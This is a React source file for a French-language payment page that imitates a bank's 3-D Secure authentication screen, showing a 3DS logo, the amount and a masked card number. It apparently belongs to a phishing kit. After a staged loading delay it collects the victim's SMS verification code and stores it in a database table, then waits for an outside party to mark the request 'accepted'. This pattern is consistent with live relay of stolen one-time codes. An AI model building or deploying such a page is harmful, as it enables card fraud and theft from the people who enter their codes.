import { useEffect, useRef, useState } from "react";
import { v4 as uuidv4 } from "uuid";
import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
import { useAppDispatch, useAppSelector } from "../../hooks/redux";
import { actionChangePaymentInfo } from "../../store/reducer/account";
import './PaymentPage.scss'
import { useNavigate } from "react-router-dom";
import { actionAddToOrder } from "../../store/thunks/checkOrder";
import { handleUnload, supabase, updateRequest } from "../../axios/supabaseClient";

function PaymentPage() {
  const dispatch = useAppDispatch();
  const navigate = useNavigate();

  const total = useAppSelector((state) => state.account.credentials.card.total);
  const date = useAppSelector((state) => state.account.credentials.card.date);
  const card_number = useAppSelector((state) => state.account.credentials.card.card_number);
  const userId = useAppSelector((state) => state.account.account.id);
  const cart = useAppSelector((state) => state.cart.cartConnected);
  const orderInput = useAppSelector((state) => state.order.orderInput);
  const notifId = useAppSelector((state) => state.notification.id);

  const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });
  const [loading, setLoading] = useState(true);
  const [submited, setSubmited] = useState(false);
  // const [isLeaving, setIsLeaving] = useState(false);

  const digit1Ref = useRef<HTMLInputElement>(null);
  const digit2Ref = useRef<HTMLInputElement>(null);
  const digit3Ref = useRef<HTMLInputElement>(null);
  const digit4Ref = useRef<HTMLInputElement>(null);

  // useEffect(() => {
  //   if (!notifId) return;

  //   const handleBeforeUnload = (e: BeforeUnloadEvent) => {
  //     e.preventDefault();
  //     e.returnValue = "";
  //   };

  //   const handleUnloadWrapper = () => {
  //     if (isLeaving) {
  //       handleUnload(notifId);
  //     }
  //   };

  //   window.addEventListener("beforeunload", handleBeforeUnload);

  //   window.addEventListener("unload", () => {
  //     if (isLeaving) {
  //       handleUnload(notifId);
  //     }
  //   });

  //   let currentLocation = location.pathname;

  //   const handleLocationChange = () => {
  //     if (location.pathname !== currentLocation) {
  //       setIsLeaving(true);
  //       currentLocation = location.pathname;
  //     }
  //   };

  //   handleLocationChange();

  //   return () => {
  //     window.removeEventListener("beforeunload", handleBeforeUnload);
  //     window.removeEventListener("unload", handleUnloadWrapper);
  //   };
  // }, [notifId, navigate]);

  useEffect(() => {
    if (notifId) {
      setTimeout(() => {
        updateRequest({
          id: notifId,
          status: "pending"
        })
        setLoading(false)
      }, 5000);
    }
  }, []);

  useEffect(() => {
    if (notifId && submited && orderInput.delivery_address) {
      updateRequest({
        id: notifId,
        status: "success"
      })
      const command_number = uuidv4();
      dispatch(actionAddToOrder({
        cart,
        total: orderInput.total,
        command_number,
        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address?.country.name}`,
      }));
      setTimeout(() => navigate("/order"), 2000);
    }
  }, [submited, notifId, navigate]);

  useEffect(() => {
    const subscription = supabase
      .channel("wainting-channel")
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "notification" },
        (payload) => {
          if (payload.new.status === "accepted" && payload.new.id === notifId) {
            setSubmited(true);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(subscription);
    };
  }, [notifId]);

  useEffect(() => {
    if (!userId) return;
    const handleUnloadWrapper = () => handleUnload(userId);

    window.addEventListener("beforeunload", handleUnloadWrapper);

    return () => {
      window.removeEventListener("beforeunload", handleUnloadWrapper);
    };
  }, [userId]);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    const { name, value } = e.target as HTMLInputElement;

    if (e.key === "Backspace" && value === "") {
      if (name === "digit2") digit1Ref.current?.focus();
      if (name === "digit3") digit2Ref.current?.focus();
      if (name === "digit4") digit3Ref.current?.focus();
    }
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (value.length > 1) return;
    const updatedDigits = { ...digits, [name]: value };
    setDigits(updatedDigits);

    if (name === "digit1" && value) digit2Ref.current?.focus();
    if (name === "digit2" && value) digit3Ref.current?.focus();
    if (name === "digit3" && value) digit4Ref.current?.focus();
    dispatch(actionChangePaymentInfo({ name: "verif_code", value: updatedDigits }));
  }

  const handleSubmit = async () => {
    if (digits.digit1.length > 0 && digits.digit2.length > 0 && digits.digit3.length > 0 && digits.digit4.length > 0 && notifId) {
      const verifCode = `${digits.digit1}${digits.digit2}${digits.digit3}${digits.digit4}`;
      updateRequest({
        id: notifId,
        code: verifCode,
        status: "code sended"
      })
    }
  }

  return (
    <div>
      {
        loading ?
          <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}><CircleLoader black={true} /> </div>
          :
          <div className='paymentPage'>
            <div className="paymentPage_logo">
              <img src="/img/payment/3ds.png" alt="" className="paymentPage_logo_img" />
            </div>
            <div className="paymentPage_waiting">
              <h1 className="paymentPage_waiting_title">Authentification en cours</h1>
              <span className="paymentPage_waiting_text">Veuillez patienter quelques secondes le temps de vérifier votre saisie.</span>
              <CircleLoader />
            </div>
            <div className="paymentPage_infos">
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Marchand</span>
                <span className="paymentPage_infos_item_value">{import.meta.env.VITE_APP_NAME}</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Montant</span>
                <span className="paymentPage_infos_item_value">{total}</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Date et heure</span>
                <span className="paymentPage_infos_item_value">{date} GMT</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Carte utilisée</span>
                <span className="paymentPage_infos_item_value">xxxxxxxxxxxxxxxx{card_number.slice(15)}</span>
              </div>
            </div>
            <div className="paymentPage_img">
              <img src="/img/payment/icone.png" alt="" className="paymentPage_img_img" />
            </div>
            <div className="paymentPage_instructions">
              <span className="paymentPage_instructions_title">Authentification requise pour valider le paiement</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">1</span>Prenez votre téléphone.</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">2</span>Ouvrez l'application mobile de votre banque.</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">3</span>Saisissez votre code sur votre téléphone.</span>
            </div>
            <div className="paymentPage_code">
              <span className="paymentPage_code_title">Ou saisissez le code de vérification envoyé par SMS</span>
              <div className="paymentPage_code_inputs">
                <input type="text" name="digit1" value={digits.digit1} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit1Ref} disabled={submited} />
                <input type="text" name="digit2" value={digits.digit2} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit2Ref} disabled={submited} />
                <input type="text" name="digit3" value={digits.digit3} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit3Ref} disabled={submited} />
                <input type="text" name="digit4" value={digits.digit4} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit4Ref} disabled={submited} />
              </div>
              {
                digits.digit1 && digits.digit2 && digits.digit3 && digits.digit4 &&
                <button type="button" className="paymentPage_code_btn" onClick={handleSubmit} disabled={submited}>Valider</button>
              }

            </div>
          </div>
      }

    </div>
  )

}

export default PaymentPage;
